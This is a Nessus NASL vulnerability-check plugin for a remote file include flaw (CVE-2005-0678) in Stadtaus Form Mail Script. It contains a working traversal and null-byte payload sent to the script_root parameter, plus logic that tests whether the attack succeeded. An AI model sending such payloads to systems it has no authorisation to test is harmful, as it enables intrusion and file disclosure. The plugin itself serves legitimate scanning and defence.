#
# (C) Tenable Network Security
#


if (description) {
  script_id(17285);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-0678");
  script_bugtraq_id(12735);

  script_name(english:"Stadtaus Form Mail Script Remote File Include Vulnerability");

  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include flaw. 

Description :

There is a version of Form Mail Script, a PHP script by Ralf Stadtaus,
installed on the remote host that suffers from a remote file include
vulnerability involving the 'script_root' parameter of the
'inc/formmail.inc.php' script.  By leveraging this flaw, an attacker
may be able to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts if PHP's
'register_globals' setting is enabled. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-03/0083.html
http://www.stadtaus.com/forum/p-5887.html

Solution : 

Upgrade to Form Mail Script version 2.4 or later. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects file include vulnerabilities in Stadtaus' PHP Scripts";
  script_summary(english:summary["english"]);
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security.");

  script_category(ACT_ATTACK);
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


foreach dir (make_list(cgi_dirs())) {
  # Try to exploit the form to grab the mail template.
  req = http_get(item:string(dir, "/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt%00"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # It's a problem if...
  if (
    # we get the template back or...
     'From: "{firstname} {lastname}" <{email}>' >< res  ||
    # magic_quotes_gpc=1 prevented us from opening the file.
    egrep(pattern:"<b>Warning</b>:  main\(\.\./templates/mail\.tpl\.txt\\0inc/functions\.inc\.php\)", string:res)
  ) {
    security_warning(port);
    exit(0);
  }
}
